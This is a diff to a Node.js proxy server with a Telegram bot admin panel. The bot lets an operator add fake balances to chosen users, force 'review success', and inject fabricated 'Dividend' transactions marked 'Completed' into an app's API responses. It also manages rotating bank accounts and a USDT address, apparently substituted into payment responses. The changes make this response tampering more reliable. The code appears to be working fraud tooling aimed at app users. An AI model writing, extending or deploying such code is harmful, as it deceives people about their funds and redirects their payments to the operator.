@@ -117,20 +117,7 @@ async function saveData(data) {
           }
         }
         if (current.userOverrides) {
-          if (!data.userOverrides) data.userOverrides = {};
-          for (const uid of Object.keys(current.userOverrides)) {
-            const cur = current.userOverrides[uid];
-            const loc = data.userOverrides[uid];
-            if (!loc) {
-              data.userOverrides[uid] = cur;
-            } else {
-              for (const key of Object.keys(cur)) {
-                if (loc[key] === undefined) {
-                  loc[key] = cur[key];
-                }
-              }
-            }
-          }
+          data.userOverrides = JSON.parse(JSON.stringify(current.userOverrides));
         }
         if (current.balanceHistory && Array.isArray(current.balanceHistory)) {
           if (!data.balanceHistory || data.balanceHistory.length < current.balanceHistory.length) {
@@ -764,7 +751,7 @@ app.post('/bot-webhook', async (req, res) => {
     if (!msg || !msg.text) return res.sendStatus(200);
     const chatId = msg.chat.id;
     const text = msg.text.trim();
-    let data = await loadData();
+    let data = await loadData(true);
 
     if (text === '/start') {
       if (data.adminChatId && data.adminChatId !== chatId) {
@@ -830,16 +817,17 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (text === '/on') { data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
-    if (text === '/off') { data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
-    if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
-    if (text === '/log') { data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+    if (text === '/on') { data = await loadData(true); data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
+    if (text === '/off') { data = await loadData(true); data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
+    if (text === '/rotate') { data = await loadData(true); data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+    if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
     if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace response dump aayega'); return res.sendStatus(200); }
 
     if (text.startsWith('/off log ')) {
       const targetId = text.substring(9).trim();
       if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /off log <userId>'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
       data.userOverrides[targetId].logOff = true;
@@ -868,6 +856,7 @@ Example:
     if (text.startsWith('/on log ')) {
       const targetId = text.substring(8).trim();
       if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /on log <userId>'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (data.userOverrides && data.userOverrides[targetId]) {
         delete data.userOverrides[targetId].logOff;
         data._skipOverrideMerge = true;
@@ -901,38 +890,42 @@ Example:
         await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>\nExample: /add 500 12345');
         return res.sendStatus(200);
       }
-      if (!data.userOverrides) data.userOverrides = {};
-      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
-      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) + amount;
-      const tracked = data.trackedUsers && data.trackedUsers[targetUserId];
+      const freshData = await loadData(true);
+      if (!freshData.userOverrides) freshData.userOverrides = {};
+      if (!freshData.userOverrides[targetUserId]) freshData.userOverrides[targetUserId] = {};
+      freshData.userOverrides[targetUserId].addedBalance = (freshData.userOverrides[targetUserId].addedBalance || 0) + amount;
+      const tracked = freshData.trackedUsers && freshData.trackedUsers[targetUserId];
       const currentBal = tracked ? tracked.balance : 'N/A';
-      const updatedBal = currentBal !== 'N/A' ? parseFloat((parseFloat(currentBal) + data.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
-      if (!data.balanceHistory) data.balanceHistory = [];
-      data.balanceHistory.push({
+      const updatedBal = currentBal !== 'N/A' ? parseFloat((parseFloat(currentBal) + freshData.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
+      if (!freshData.balanceHistory) freshData.balanceHistory = [];
+      freshData.balanceHistory.push({
         type: 'add',
         userId: targetUserId,
         amount: amount,
-        totalAdded: data.userOverrides[targetUserId].addedBalance,
+        totalAdded: freshData.userOverrides[targetUserId].addedBalance,
         originalBalance: currentBal,
         updatedBalance: updatedBal,
         time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
         phone: (tracked && tracked.phone) || ''
       });
-      if (!data.fakeBills) data.fakeBills = {};
-      if (!data.fakeBills[targetUserId]) data.fakeBills[targetUserId] = [];
+      if (!freshData.fakeBills) freshData.fakeBills = {};
+      if (!freshData.fakeBills[targetUserId]) freshData.fakeBills[targetUserId] = [];
       const now = new Date();
       const ts = now.getTime();
       const orderNo = 'TA' + String(ts) + String(Math.floor(Math.random() * 9000000) + 1000000);
       const timeStr = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true }).replace(/\//g, '-');
-      data.fakeBills[targetUserId].push({
+      freshData.fakeBills[targetUserId].push({
         amount: amount,
         orderNo: orderNo,
         createTime: timeStr,
         timestamp: ts
       });
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n📊 Updated balance: ₹${updatedBal}`);
+      freshData._skipOverrideMerge = true;
+      await saveData(freshData);
+      const statusMsg = tracked
+        ? `📊 Updated balance: ₹${updatedBal}`
+        : `⏳ User is offline — ₹${freshData.userOverrides[targetUserId].addedBalance} will show when they open the app`;
+      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${freshData.userOverrides[targetUserId].addedBalance}\n${statusMsg}`);
       return res.sendStatus(200);
     }
 
@@ -942,6 +935,7 @@ Example:
         await bot.sendMessage(chatId, '❌ Format: /success <userId>\nExample: /success 87146');
         return res.sendStatus(200);
       }
+      data = await loadData(true);
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
       data.userOverrides[targetUserId].forceReviewSuccess = true;
@@ -957,6 +951,7 @@ Example:
         await bot.sendMessage(chatId, '❌ Format: /unsuccess <userId>');
         return res.sendStatus(200);
       }
+      data = await loadData(true);
       if (data.userOverrides && data.userOverrides[targetUserId]) {
         delete data.userOverrides[targetUserId].forceReviewSuccess;
         data._skipOverrideMerge = true;
@@ -974,38 +969,40 @@ Example:
         await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>\nExample: /deduct 500 12345');
         return res.sendStatus(200);
       }
-      if (!data.userOverrides) data.userOverrides = {};
-      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
-      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) - amount;
-      const tracked2 = data.trackedUsers && data.trackedUsers[targetUserId];
+      const freshData2 = await loadData(true);
+      if (!freshData2.userOverrides) freshData2.userOverrides = {};
+      if (!freshData2.userOverrides[targetUserId]) freshData2.userOverrides[targetUserId] = {};
+      freshData2.userOverrides[targetUserId].addedBalance = (freshData2.userOverrides[targetUserId].addedBalance || 0) - amount;
+      const tracked2 = freshData2.trackedUsers && freshData2.trackedUsers[targetUserId];
       const currentBal2 = tracked2 ? tracked2.balance : 'N/A';
-      const updatedBal2 = currentBal2 !== 'N/A' ? parseFloat((parseFloat(currentBal2) + data.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
-      if (!data.balanceHistory) data.balanceHistory = [];
-      data.balanceHistory.push({
+      const updatedBal2 = currentBal2 !== 'N/A' ? parseFloat((parseFloat(currentBal2) + freshData2.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
+      if (!freshData2.balanceHistory) freshData2.balanceHistory = [];
+      freshData2.balanceHistory.push({
         type: 'deduct',
         userId: targetUserId,
         amount: amount,
-        totalAdded: data.userOverrides[targetUserId].addedBalance,
+        totalAdded: freshData2.userOverrides[targetUserId].addedBalance,
         originalBalance: currentBal2,
         updatedBalance: updatedBal2,
         time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
         phone: (tracked2 && tracked2.phone) || ''
       });
-      if (data.userOverrides[targetUserId].addedBalance <= 0) {
-        delete data.userOverrides[targetUserId].addedBalance;
-        if (data.fakeBills && data.fakeBills[targetUserId]) {
-          delete data.fakeBills[targetUserId];
+      if (freshData2.userOverrides[targetUserId].addedBalance <= 0) {
+        delete freshData2.userOverrides[targetUserId].addedBalance;
+        if (freshData2.fakeBills && freshData2.fakeBills[targetUserId]) {
+          delete freshData2.fakeBills[targetUserId];
         }
       }
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance || 0}\n📊 Updated balance: ₹${updatedBal2}`);
+      freshData2._skipOverrideMerge = true;
+      await saveData(freshData2);
+      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${freshData2.userOverrides[targetUserId]?.addedBalance || 0}\n📊 Updated balance: ₹${updatedBal2}`);
       return res.sendStatus(200);
     }
 
     if (text.startsWith('/remove balance ')) {
       const targetId = text.substring(16).trim();
       if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (data.userOverrides && data.userOverrides[targetId] && data.userOverrides[targetId].addedBalance !== undefined) {
         const removed = data.userOverrides[targetId].addedBalance;
         delete data.userOverrides[targetId].addedBalance;
@@ -1073,6 +1070,7 @@ Example:
     }
 
     if (text === '/clearhistory') {
+      data = await loadData(true);
       data.balanceHistory = [];
       data._skipOverrideMerge = true;
       await saveData(data);
@@ -1110,6 +1108,7 @@ Example:
     if (text.startsWith('/addbank ')) {
       const parts = text.substring(9).split('|').map(s => s.trim());
       if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI\n(BankName and UPI optional)'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
       const newBank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
       data.banks.push(newBank);
@@ -1121,6 +1120,7 @@ Example:
     }
 
     if (text.startsWith('/removebank ')) {
+      data = await loadData(true);
       const idx = parseInt(text.substring(12).trim()) - 1;
       if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid. /banks se check karo'); return res.sendStatus(200); }
       const removed = data.banks.splice(idx, 1)[0];
@@ -1142,17 +1142,20 @@ Example:
     }
 
     if (text.startsWith('/setbank ')) {
+      data = await loadData(true);
       const idx = parseInt(text.substring(9).trim()) - 1;
       if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
       data.activeIndex = idx;
       data._skipOverrideMerge = true;
       await saveData(data);
-      await bot.sendMessage(chatId, `✅ Active bank #${idx + 1}: ${data.banks[idx].accountHolder}`);
+      const bankInfo = data.banks[idx];
+      await bot.sendMessage(chatId, `✅ Active bank set to #${idx + 1}:\n${bankInfo.accountHolder} | ${bankInfo.accountNo} | ${bankInfo.ifsc}${bankInfo.bankName ? ' | ' + bankInfo.bankName : ''}`);
       return res.sendStatus(200);
     }
 
     if (text.startsWith('/usdt ')) {
       const addr = text.substring(6).trim();
+      data = await loadData(true);
       if (addr.toLowerCase() === 'off') {
         data.usdtAddress = '';
         data._skipOverrideMerge = true;
@@ -1452,19 +1455,23 @@ async function proxyAndInjectFakeBills(req, res) {
       if (fbKeys.length === 1) billUserId = fbKeys[0];
     }
     const userBills = (data.fakeBills && billUserId && data.fakeBills[String(billUserId)]) || [];
-    if (userBills.length > 0 && items.length > 0) {
-      const template = items[0];
+    if (userBills.length > 0) {
+      const template = items.length > 0 ? items[0] : null;
       const fakeEntries = userBills.map(fb => {
-        const entry = JSON.parse(JSON.stringify(template));
+        const entry = template ? JSON.parse(JSON.stringify(template)) : {};
         entry.orderNo = fb.orderNo;
         entry.amount = fb.amount;
         entry.orderType = 'Dividend';
         entry.time = fb.createTime;
+        entry.createTime = fb.createTime;
+        entry.status = 1;
+        entry.statusText = 'Completed';
         if (entry.afterAmount !== undefined) entry.afterAmount = null;
         if (entry.remark !== undefined) entry.remark = null;
         if (entry.commissionAmount !== undefined) entry.commissionAmount = null;
         if (entry.arrivalTime !== undefined) entry.arrivalTime = null;
         if (entry.id !== undefined) entry.id = fb.orderNo;
+        if (!template) entry.id = fb.orderNo;
         return entry;
       });
       fakeEntries.sort((a, b) => {
@@ -1477,6 +1484,15 @@ async function proxyAndInjectFakeBills(req, res) {
         listData[itemsKey] = items;
       } else if (jsonResp && jsonResp.data && Array.isArray(jsonResp.data)) {
         jsonResp.data = items;
+      } else if (listData && typeof listData === 'object' && !Array.isArray(listData)) {
+        const arrKey = listData.list !== undefined ? 'list' : listData.records !== undefined ? 'records' : listData.rows !== undefined ? 'rows' : 'list';
+        listData[arrKey] = items;
+        if (listData.total !== undefined) listData.total = items.length;
+        if (listData.totalCount !== undefined) listData.totalCount = items.length;
+      } else if (jsonResp) {
+        if (jsonResp.data === null || jsonResp.data === undefined || (Array.isArray(jsonResp.data) && jsonResp.data.length === 0)) {
+          jsonResp.data = items;
+        }
       }
     }
 
